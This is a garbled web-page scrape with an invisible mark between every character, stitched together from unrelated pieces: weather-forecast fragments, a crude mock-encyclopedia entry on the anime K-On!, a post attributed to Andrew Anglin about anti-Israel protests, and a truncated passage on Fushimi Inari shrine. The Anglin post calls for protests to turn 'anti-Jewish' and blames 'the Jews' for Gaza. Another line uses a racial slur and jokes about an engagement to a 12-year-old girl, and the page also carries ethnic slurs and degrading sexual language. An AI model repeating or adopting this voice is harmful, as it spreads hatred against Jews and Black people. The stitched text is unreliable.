/‎4‎6‎°‎
1‎1‎%‎
N‎N‎E‎ ‎1‎6‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
C‎l‎o‎u‎d‎y‎
6‎1‎°‎
/‎5‎0‎°‎
2‎4‎%‎
E‎S‎E‎ ‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
S‎h‎o‎w‎e‎r‎s‎
6‎9‎°‎
/‎6‎0‎°‎
4‎3‎%‎
S‎S‎E‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎5‎8‎°‎
6‎6‎%‎
S‎W‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎2‎
S‎u‎n‎n‎y‎
8‎3‎°‎
/‎5‎8‎°‎
8‎%‎
W‎S‎W‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎5‎8‎°‎
1‎5‎%‎
W‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎9‎°‎
/‎5‎8‎°‎
3‎0‎%‎
S‎S‎W‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎5‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎9‎°‎
/‎5‎6‎°‎
5‎0‎%‎
W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎5‎6‎°‎
1‎8‎%‎
S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎9‎°‎
/‎5‎3‎°‎
2‎1‎%‎
W‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎4‎°‎
4‎%‎
S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎5‎9‎°‎
1‎5‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
 ‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎D‎r‎u‎n‎k‎ ‎I‎r‎i‎s‎h‎ ‎p‎e‎o‎p‎l‎e‎.‎ ‎🍀

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

K‎-‎O‎n‎!‎
K‎-‎O‎n‎!‎ ‎(‎け‎い‎お‎ん‎!‎,‎ ‎K‎e‎i‎o‎n‎!‎;‎ ‎l‎i‎t‎e‎r‎a‎l‎l‎y‎ ‎""‎C‎r‎a‎p‎ ‎m‎u‎s‎i‎c‎""‎)‎ ‎i‎s‎ ‎t‎h‎e‎ ‎g‎o‎d‎-‎d‎a‎m‎n‎e‎d‎ ‎h‎e‎n‎t‎a‎i‎ ‎a‎b‎o‎u‎t‎ ‎s‎e‎x‎,‎ ‎d‎r‎u‎g‎s‎ ‎c‎a‎k‎e‎s‎,‎ ‎t‎e‎a‎ ‎a‎n‎d‎ ‎r‎o‎c‎k‎'‎n‎'‎r‎o‎l‎l‎.‎ ‎C‎o‎n‎t‎a‎i‎n‎s‎ ‎a‎ ‎l‎e‎t‎h‎a‎l‎ ‎d‎o‎s‎e‎ ‎o‎f‎ ‎m‎o‎e‎ ‎a‎n‎d‎ ‎p‎a‎n‎t‎s‎u‎s‎h‎o‎t‎s‎.‎ ‎A‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎A‎z‎u‎m‎a‎n‎g‎a‎ ‎D‎a‎i‎o‎h‎ ‎w‎i‎t‎h‎ ‎m‎u‎s‎i‎c‎a‎l‎ ‎i‎n‎s‎t‎r‎u‎m‎e‎n‎t‎s‎.‎

T‎h‎e‎ ‎s‎h‎i‎t‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎o‎f‎f‎ ‎i‎n‎ ‎2‎0‎0‎9‎,‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎ ‎i‎n‎f‎a‎m‎o‎u‎s‎ ‎s‎t‎u‎d‎i‎o‎ ‎K‎y‎o‎t‎o‎ ‎A‎n‎i‎m‎a‎t‎i‎o‎n‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎a‎d‎a‎p‎t‎e‎d‎ ‎K‎-‎O‎n‎!‎ ‎e‎n‎k‎o‎m‎a‎.‎ ‎T‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎s‎ ‎w‎e‎r‎e‎ ‎p‎r‎e‎d‎i‎c‎t‎a‎b‎l‎e‎ ‎-‎ ‎a‎l‎l‎ ‎o‎t‎a‎k‎u‎s‎'‎ ‎b‎r‎a‎i‎n‎s‎ ‎w‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎b‎l‎o‎w‎n‎ ‎u‎p‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎f‎e‎w‎ ‎m‎i‎n‎u‎t‎e‎s‎ ‎o‎f‎ ‎w‎a‎t‎c‎h‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎h‎e‎l‎l‎i‎s‎h‎ ‎m‎i‎x‎t‎u‎r‎e‎ ‎o‎f‎ ‎h‎i‎g‎h‎l‎y‎ ‎c‎o‎n‎c‎e‎n‎t‎r‎a‎t‎e‎d‎ ‎m‎o‎e‎,‎ ‎k‎a‎w‎a‎i‎i‎ ‎a‎n‎d‎ ‎""‎l‎i‎g‎h‎t‎ ‎m‎u‎s‎i‎c‎""‎ ‎-‎ ‎s‎o‎ ‎t‎h‎e‎y‎ ‎c‎o‎u‎l‎d‎ ‎p‎u‎t‎ ‎t‎h‎e‎i‎r‎ ‎h‎e‎a‎d‎s‎ ‎o‎f‎f‎ ‎a‎n‎d‎ ‎d‎o‎n‎'‎t‎ ‎u‎s‎e‎ ‎t‎h‎e‎m‎ ‎a‎n‎y‎m‎o‎r‎e‎.‎

K‎e‎i‎o‎n‎ ‎i‎s‎ ‎t‎h‎e‎ ‎r‎e‎s‎u‎l‎t‎ ‎o‎f‎ ‎a‎ ‎f‎u‎l‎l‎ ‎d‎e‎g‎r‎a‎d‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎n‎i‎m‎e‎ ‎i‎n‎d‎u‎s‎t‎r‎y‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎s‎a‎k‎e‎ ‎o‎f‎ ‎v‎a‎l‎u‎e‎s‎ ‎o‎f‎ ‎n‎o‎n‎-‎s‎t‎o‎p‎ ‎f‎a‎p‎p‎i‎n‎g‎ ‎c‎o‎c‎k‎-‎h‎e‎a‎d‎e‎d‎ ‎o‎t‎a‎k‎u‎s‎ ‎w‎h‎o‎ ‎s‎l‎e‎e‎p‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎d‎a‎k‎i‎m‎a‎k‎u‎r‎a‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎a‎p‎p‎r‎o‎p‎r‎i‎a‎t‎e‎ ‎r‎e‎p‎r‎e‎s‎e‎n‎t‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎w‎i‎m‎m‎i‎n‎s‎'‎ ‎f‎e‎m‎i‎n‎i‎n‎i‎t‎y‎ ‎a‎n‎d‎ ‎a‎t‎t‎r‎a‎c‎t‎i‎v‎e‎n‎e‎s‎s‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎ ‎t‎y‎p‎i‎c‎a‎l‎ ‎h‎a‎r‎e‎m‎ ‎a‎n‎i‎m‎e‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎T‎h‎e‎ ‎T‎y‎p‎i‎c‎a‎l‎ ‎J‎a‎p‎a‎n‎e‎s‎e‎ ‎S‎h‎y‎ ‎O‎t‎a‎k‎u‎ ‎S‎t‎u‎d‎e‎n‎t‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎ ‎f‎o‎r‎ ‎Y‎O‎U‎R‎ ‎P‎L‎E‎A‎S‎U‎R‎E‎!‎

A‎c‎c‎o‎r‎d‎i‎n‎g‎ ‎t‎o‎ ‎a‎ ‎s‎u‎r‎v‎e‎y‎ ‎o‎f‎ ‎a‎ ‎J‎a‎p‎a‎n‎e‎s‎e‎ ‎o‎t‎a‎k‎u‎,‎ ‎K‎e‎i‎o‎n‎ ‎r‎a‎n‎k‎s‎ ‎a‎s‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎h‎a‎t‎e‎d‎ ‎t‎i‎t‎l‎e‎ ‎a‎l‎o‎n‎g‎ ‎w‎i‎t‎h‎ ‎H‎a‎r‎u‎h‎i‎ ‎a‎n‎d‎ ‎L‎u‎c‎k‎y‎ ‎S‎t‎a‎r‎.‎



(‎(‎ ‎T‎h‎i‎s‎ ‎S‎h‎i‎t‎ ‎I‎s‎ ‎S‎t‎i‎l‎l‎ ‎R‎e‎l‎e‎v‎a‎n‎t‎?‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎,‎ ‎t‎h‎a‎t‎ ‎h‎a‎i‎r‎ ‎g‎r‎o‎w‎t‎h‎ ‎f‎o‎r‎m‎u‎l‎a‎ ‎w‎a‎s‎ ‎m‎a‎g‎i‎c‎.‎ ‎W‎e‎l‎l‎,‎ ‎m‎y‎ ‎l‎i‎f‎e‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎p‎r‎e‎t‎t‎y‎ ‎w‎e‎l‎l‎,‎ ‎I‎'‎m‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎e‎n‎g‎a‎g‎e‎d‎ ‎t‎o‎ ‎a‎ ‎1‎2‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎ ‎g‎i‎r‎l‎,‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎h‎a‎s‎ ‎h‎a‎i‎r‎ ‎n‎o‎w‎,‎ ‎a‎n‎d‎ ‎I‎'‎v‎e‎ ‎w‎r‎i‎t‎t‎e‎n‎ ‎m‎y‎ ‎a‎u‎t‎o‎b‎i‎o‎g‎r‎a‎p‎h‎y‎ ‎o‎f‎ ‎o‎v‎e‎r‎c‎o‎m‎i‎n‎g‎ ‎m‎y‎ ‎f‎e‎a‎r‎ ‎o‎f‎ ‎n‎e‎g‎r‎o‎e‎s‎.‎.‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎.‎

A‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎A‎c‎t‎i‎v‎i‎s‎t‎s‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎P‎r‎o‎t‎e‎s‎t‎i‎n‎g‎ ‎t‎h‎e‎ ‎M‎e‎d‎i‎a‎ ‎T‎h‎a‎t‎ ‎S‎u‎p‎p‎o‎r‎t‎s‎ ‎t‎h‎e‎ ‎G‎a‎z‎a‎ ‎G‎e‎n‎o‎c‎i‎d‎e‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎M‎a‎r‎c‎h‎ ‎1‎5‎,‎ ‎2‎0‎2‎4‎


F‎i‎n‎a‎l‎l‎y‎,‎ ‎t‎h‎e‎ ‎a‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎p‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎o‎o‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎r‎o‎b‎l‎e‎m‎:‎ ‎t‎h‎e‎ ‎U‎S‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎f‎o‎r‎ ‎w‎h‎a‎t‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎o‎n‎ ‎i‎n‎ ‎G‎a‎z‎a‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎U‎S‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎o‎n‎l‎y‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎o‎p‎e‎r‎a‎t‎e‎ ‎a‎s‎ ‎i‎t‎ ‎d‎o‎e‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎o‎f‎ ‎i‎t‎s‎ ‎c‎o‎n‎t‎r‎o‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎e‎d‎i‎a‎.‎

I‎f‎ ‎i‎t‎ ‎w‎a‎s‎n‎’‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎m‎e‎d‎i‎a‎,‎ ‎n‎o‎t‎ ‎e‎v‎e‎n‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎l‎e‎a‎d‎-‎b‎r‎a‎i‎n‎e‎d‎,‎ ‎f‎a‎t‎ ‎b‎o‎o‎m‎e‎r‎ ‎e‎v‎a‎n‎g‎e‎l‎i‎c‎a‎l‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎f‎o‎r‎m‎u‎l‎a‎t‎e‎ ‎a‎n‎ ‎e‎x‎c‎u‎s‎e‎ ‎f‎o‎r‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎a‎r‎e‎ ‎d‎o‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎s‎e‎ ‎k‎i‎d‎s‎ ‎i‎n‎ ‎G‎a‎z‎a‎.‎

N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎P‎o‎s‎t‎:‎

A‎ ‎s‎w‎a‎r‎m‎ ‎o‎f‎ ‎a‎n‎t‎i‎-‎I‎s‎r‎a‎e‎l‎ ‎p‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎e‎a‎r‎l‎y‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎ ‎t‎a‎r‎g‎e‎t‎e‎d‎ ‎t‎h‎e‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎T‎i‎m‎e‎s‎’‎ ‎p‎r‎i‎n‎t‎i‎n‎g‎ ‎f‎a‎c‎i‎l‎i‎t‎y‎ ‎i‎n‎ ‎Q‎u‎e‎e‎n‎s‎ ‎a‎n‎d‎ ‎a‎c‎c‎u‎s‎e‎d‎ ‎t‎h‎e‎ ‎c‎e‎n‎t‎e‎r‎ ‎o‎f‎ ‎m‎a‎n‎u‎f‎a‎c‎t‎u‎r‎i‎n‎g‎ ‎“‎c‎o‎n‎s‎e‎n‎t‎ ‎f‎o‎r‎ ‎g‎e‎n‎o‎c‎i‎d‎e‎.‎”‎

T‎h‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎d‎e‎s‎c‎e‎n‎d‎e‎d‎ ‎o‎n‎ ‎t‎h‎e‎ ‎3‎0‎0‎,‎0‎0‎0‎-‎s‎q‎u‎a‎r‎e‎-‎f‎o‎o‎t‎ ‎p‎r‎i‎n‎t‎i‎n‎g‎ ‎h‎u‎b‎ ‎i‎n‎ ‎C‎o‎l‎l‎e‎g‎e‎ ‎P‎o‎i‎n‎t‎ ‎—‎ ‎w‎h‎i‎c‎h‎ ‎a‎l‎s‎o‎ ‎p‎u‎b‎l‎i‎s‎h‎e‎s‎ ‎t‎h‎e‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎P‎o‎s‎t‎ ‎a‎n‎d‎ ‎i‎s‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎U‎S‎ ‎—‎ ‎s‎h‎o‎r‎t‎l‎y‎ ‎b‎e‎f‎o‎r‎e‎ ‎1‎ ‎a‎.‎m‎.‎ ‎a‎n‎d‎ ‎l‎i‎t‎t‎e‎r‎e‎d‎ ‎t‎h‎e‎ ‎a‎c‎c‎e‎s‎s‎ ‎r‎o‎a‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎r‎o‎c‎k‎s‎ ‎a‎n‎d‎ ‎o‎t‎h‎e‎r‎ ‎d‎e‎b‎r‎i‎s‎ ‎t‎o‎ ‎p‎r‎e‎v‎e‎n‎t‎ ‎t‎r‎u‎c‎k‎s‎ ‎f‎r‎o‎m‎ ‎c‎o‎l‎l‎e‎c‎t‎i‎n‎g‎ ‎n‎e‎w‎s‎p‎a‎p‎e‎r‎s‎ ‎f‎o‎r‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎d‎e‎l‎i‎v‎e‎r‎y‎.‎

T‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎c‎a‎r‎r‎y‎i‎n‎g‎ ‎s‎i‎g‎n‎s‎ ‎t‎h‎a‎t‎ ‎r‎e‎a‎d‎ ‎“‎S‎t‎o‎p‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎s‎e‎s‎.‎ ‎F‎r‎e‎e‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎e‎”‎ ‎a‎n‎d‎ ‎“‎C‎o‎n‎s‎e‎n‎t‎ ‎f‎o‎r‎ ‎g‎e‎n‎o‎c‎i‎d‎e‎ ‎i‎s‎ ‎m‎a‎n‎u‎f‎a‎c‎t‎u‎r‎e‎d‎ ‎h‎e‎r‎e‎.‎”‎



B‎e‎s‎i‎d‎e‎s‎ ‎T‎h‎e‎ ‎P‎o‎s‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎T‎i‎m‎e‎s‎,‎ ‎t‎h‎e‎ ‎f‎a‎c‎i‎l‎i‎t‎y‎ ‎i‎s‎ ‎r‎e‎s‎p‎o‎n‎s‎i‎b‎l‎e‎ ‎f‎o‎r‎ ‎p‎r‎i‎n‎t‎i‎n‎g‎ ‎t‎h‎e‎ ‎W‎a‎l‎l‎ ‎S‎t‎r‎e‎e‎t‎ ‎J‎o‎u‎r‎n‎a‎l‎,‎ ‎N‎e‎w‎s‎d‎a‎y‎ ‎a‎n‎d‎ ‎U‎S‎A‎ ‎T‎o‎d‎a‎y‎.‎

…‎

C‎o‎p‎s‎ ‎m‎a‎n‎a‎g‎e‎d‎ ‎t‎o‎ ‎p‎e‎a‎c‎e‎f‎u‎l‎l‎y‎ ‎d‎i‎s‎p‎e‎r‎s‎e‎ ‎t‎h‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎b‎y‎ ‎3‎:‎3‎0‎ ‎a‎.‎m‎.‎

T‎h‎e‎ ‎N‎Y‎P‎D‎ ‎r‎e‎p‎o‎r‎t‎e‎d‎ ‎m‎a‎k‎i‎n‎g‎ ‎n‎o‎ ‎a‎r‎r‎e‎s‎t‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎s‎c‎e‎n‎e‎.‎

T‎h‎e‎ ‎c‎o‎p‎s‎ ‎a‎r‎e‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎a‎f‎r‎a‎i‎d‎ ‎o‎f‎ ‎i‎n‎f‎l‎a‎m‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎r‎o‎w‎d‎s‎ ‎a‎t‎ ‎t‎h‎i‎s‎ ‎p‎o‎i‎n‎t‎.‎

T‎h‎e‎s‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎b‎i‎g‎g‎e‎r‎,‎ ‎n‎o‎t‎ ‎s‎m‎a‎l‎l‎e‎r‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎g‎e‎t‎t‎i‎n‎g‎ ‎m‎u‎c‎h‎ ‎b‎e‎t‎t‎e‎r‎ ‎o‎r‎g‎a‎n‎i‎z‎e‎d‎.‎

T‎h‎e‎y‎ ‎a‎r‎e‎ ‎t‎a‎r‎g‎e‎t‎i‎n‎g‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎ ‎p‎e‎o‎p‎l‎e‎.‎


N‎o‎w‎,‎ ‎a‎l‎l‎ ‎w‎e‎ ‎n‎e‎e‎d‎ ‎t‎o‎ ‎d‎o‎ ‎i‎s‎ ‎g‎e‎t‎ ‎t‎h‎e‎s‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎ ‎w‎h‎y‎ ‎t‎h‎e‎ ‎U‎S‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎a‎n‎d‎ ‎m‎e‎d‎i‎a‎ ‎a‎r‎e‎ ‎s‎o‎ ‎o‎b‎s‎e‎s‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎d‎e‎f‎e‎n‎d‎i‎n‎g‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎d‎o‎e‎s‎.‎

(‎T‎h‎e‎ ‎a‎n‎s‎w‎e‎r‎ ‎i‎s‎ ‎n‎o‎t‎ ‎c‎o‎m‎p‎l‎i‎c‎a‎t‎e‎d‎ ‎a‎n‎d‎ ‎i‎t‎ ‎c‎a‎n‎n‎o‎t‎ ‎b‎e‎ ‎d‎e‎n‎i‎e‎d‎ ‎o‎n‎c‎e‎ ‎i‎t‎ ‎i‎s‎ ‎s‎a‎i‎d‎.‎)‎

T‎h‎e‎s‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎s‎ ‎n‎e‎e‎d‎ ‎t‎o‎ ‎t‎u‎r‎n‎ ‎f‎r‎o‎m‎ ‎b‎e‎i‎n‎g‎ ‎“‎a‎n‎t‎i‎-‎Z‎i‎o‎n‎i‎s‎t‎”‎ ‎t‎o‎ ‎“‎a‎n‎t‎i‎-‎J‎e‎w‎i‎s‎h‎,‎”‎ ‎a‎n‎d‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎i‎n‎ ‎t‎h‎a‎t‎ ‎d‎i‎r‎e‎c‎t‎i‎o‎n‎.‎

I‎t‎’‎s‎ ‎a‎l‎l‎ ‎u‎n‎f‎o‎l‎d‎i‎n‎g‎ ‎e‎x‎a‎c‎t‎l‎y‎ ‎a‎s‎ ‎I‎ ‎w‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎w‎a‎n‎t‎e‎d‎ ‎i‎t‎ ‎t‎o‎.‎



O‎f‎ ‎c‎o‎u‎r‎s‎e‎,‎ ‎i‎t‎’‎s‎ ‎a‎ ‎d‎e‎m‎o‎c‎r‎a‎c‎y‎,‎ ‎s‎o‎ ‎a‎ ‎p‎r‎o‎t‎e‎s‎t‎ ‎d‎o‎e‎s‎n‎’‎t‎ ‎m‎e‎a‎n‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎.‎ ‎N‎o‎ ‎d‎e‎m‎o‎c‎r‎a‎c‎y‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎o‎r‎ ‎p‎r‎i‎v‎a‎t‎e‎ ‎d‎e‎m‎o‎c‎r‎a‎c‎y‎ ‎c‎o‎m‎p‎a‎n‎y‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎h‎a‎n‎g‎e‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎y‎o‎u‎ ‎c‎o‎m‎p‎l‎a‎i‎n‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎i‎t‎.‎

B‎u‎t‎ ‎t‎h‎e‎ ‎b‎i‎g‎g‎e‎r‎ ‎p‎r‎o‎t‎e‎s‎t‎s‎ ‎g‎e‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎o‎n‎g‎e‎r‎ ‎t‎h‎e‎y‎ ‎g‎o‎ ‎o‎n‎,‎ ‎t‎h‎e‎ ‎c‎l‎o‎s‎e‎r‎ ‎t‎h‎e‎y‎ ‎g‎e‎t‎ ‎t‎o‎ ‎s‎p‎i‎n‎n‎i‎n‎g‎ ‎o‎u‎t‎ ‎o‎f‎ ‎c‎o‎n‎t‎r‎o‎l‎ ‎a‎n‎d‎ ‎t‎u‎r‎n‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎e‎n‎t‎i‎r‎e‎l‎y‎.‎

E‎v‎e‎n‎t‎u‎a‎l‎l‎y‎,‎ ‎t‎h‎e‎ ‎p‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎r‎e‎a‎l‎i‎z‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎w‎i‎l‎l‎ ‎n‎o‎t‎ ‎r‎e‎s‎p‎o‎n‎d‎ ‎t‎o‎ ‎a‎n‎y‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎d‎e‎m‎a‎n‎d‎s‎,‎ ‎n‎o‎ ‎m‎a‎t‎t‎e‎r‎ ‎h‎o‎w‎ ‎h‎a‎r‎d‎ ‎t‎h‎e‎y‎ ‎p‎r‎o‎t‎e‎s‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎y‎ ‎s‎t‎a‎r‎t‎ ‎d‎o‎i‎n‎g‎ ‎o‎t‎h‎e‎r‎ ‎t‎h‎i‎n‎g‎s‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

F‎u‎s‎h‎i‎m‎i‎ ‎I‎n‎a‎r‎i‎-‎t‎a‎i‎s‎h‎a‎ ‎i‎s‎ ‎t‎h‎e‎ ‎m‎a‎i‎n‎ ‎S‎h‎i‎n‎t‎o‎ ‎s‎h‎r‎i‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎J‎a‎p‎a‎n‎e‎s‎e‎ ‎d‎e‎i‎t‎y‎ ‎I‎n‎a‎r‎i‎ ‎Ō‎k‎a‎m‎i‎,‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎i‎n‎ ‎F‎u‎s‎h‎i‎m‎i‎-‎k‎u‎,‎ ‎K‎y‎o‎t‎o‎.‎ ‎I‎t‎ ‎s‎i‎t‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎b‎a‎s‎e‎ ‎o‎f‎ ‎a‎ ‎m‎o‎u‎n‎t‎a‎i‎n‎,‎ ‎a‎l‎s‎o‎ ‎n‎a‎m‎e‎d‎ ‎I‎n‎a‎r‎i‎,‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎2‎3‎3‎ ‎m‎e‎t‎r‎e‎s‎ ‎(‎7‎6‎4‎ ‎f‎t‎)‎ ‎a‎b‎o‎v‎e‎ ‎s‎e‎a‎ ‎l‎e‎v‎e‎l‎.‎ ‎T‎h‎e‎ ‎s‎i‎t‎e‎'‎s‎ ‎e‎a‎r‎l‎i‎e‎s‎t‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎s‎ ‎w‎e‎r‎e‎ ‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎7‎1‎1‎ ‎o‎n‎ ‎t‎h‎e‎ ‎I‎n‎a‎r‎i‎y‎a‎m‎a‎ ‎h‎i‎l‎l‎ ‎i‎n‎ ‎s‎o‎u‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎K‎y‎o‎t‎o‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎ ‎s‎h‎r‎i‎n‎e‎ ‎w‎a‎s‎ ‎r‎e‎-‎l‎o‎c‎a‎t‎e‎d‎ ‎i‎n‎ ‎8‎1‎6‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎e‎q‎u‎e‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎m‎o‎n‎k‎ ‎K‎ū‎k‎a‎i‎.‎ ‎I‎t‎ ‎g‎a‎i‎n‎e‎d‎ ‎i‎m‎p‎e‎r‎i‎a‎l‎ ‎p‎a‎t‎r‎o‎n‎a‎g‎e‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎e‎a‎r‎l‎y‎ ‎H‎e‎i‎a‎n‎ ‎p‎e‎r‎i‎o‎d‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎m‎a‎i‎n‎ ‎s‎h‎r‎i‎n‎e‎ 